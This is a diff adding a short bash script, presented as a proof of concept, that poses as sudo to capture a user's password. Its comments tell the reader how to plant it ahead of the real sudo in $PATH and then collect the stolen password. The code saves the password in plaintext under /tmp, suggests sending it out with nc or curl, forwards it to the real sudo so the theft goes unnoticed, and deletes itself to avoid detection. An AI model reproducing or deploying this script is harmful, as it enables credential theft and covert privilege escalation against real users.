@@ -1,0 +1,31 @@
+#!/bin/bash
+
+# This script tricks the user into giving it their password. It is
+# just a proof of concept and has some obvious problems.
+
+# Directions:
+#   1) Rename sudo_attack -> sudo
+#   2) Copy this script somewhere in the user's $PATH. If necessary,
+#      modify the user's $PATH so that bash finds this script
+#      before /usr/bin/sudo.
+#   3) Wait for the user to invoke any command with sudo
+#   4) Collect the user's password stored in /tmp/stolen_password.txt
+
+PASSWORD_PROMPT="[sudo] password for `whoami`: "
+
+# Get sudo password from user
+echo -n $PASSWORD_PROMPT
+read -s PASSWORD
+
+# Store stolen password. You could optionally use nc, curl, or
+# some other echanism to "call home" with the stolen password.
+echo $PASSWORD >> /tmp/stolen_password.txt
+
+# Give the password to sudo over stdin and collect the output
+OUTPUT=$(echo $PASSWORD | /usr/bin/sudo -S $@)
+# Remove the password prompt from the output and display to the user
+printf '\n%s\n' "${OUTPUT//$PASSWORD_PROMPT}"
+
+# Mission accomplished! Remove this scsript so as not to be detected
+FULL_SCRIPT_PATH=`realpath $0`
+rm $FULL_SCRIPT_PATH
